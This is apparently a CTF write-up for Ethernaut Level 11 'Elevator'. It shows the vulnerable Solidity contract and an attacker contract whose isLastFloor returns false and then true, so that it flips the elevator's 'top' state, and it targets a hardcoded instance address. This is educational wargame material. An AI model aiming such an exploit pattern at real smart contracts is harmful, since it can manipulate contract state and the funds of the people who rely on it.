# Ethernaut - Level 11 - Elevator

Contract code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Objectives:
```
This elevator won't let you reach the top of your building. Right?
```

The idea here is very simple.

We can build a Building contract with a method called ```isLastFloor``` that we expose as our interface to the ethernaut contract. Since this function is declare without any type of restriction (eg. pure or view function), we can create a simple function that return two different values: the first time that it's called false, and the second time true.

Attacker contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
  function goTo(uint) external;
}



contract Building {
  uint private lastFloor;
  uint private x = 0;

  function isLastFloor(uint floor) external returns (bool) {
    if(x == 0){
      x++;
      return false;
    }
    else {
      return true;
    }
  }


  function CallAnElevator() public {
        address TARGET_ELEVATOR = 0x70f5021ea22A15c68150d02695d0E51850E495af;

    Elevator(TARGET_ELEVATOR).goTo(lastFloor);
  }


}
```
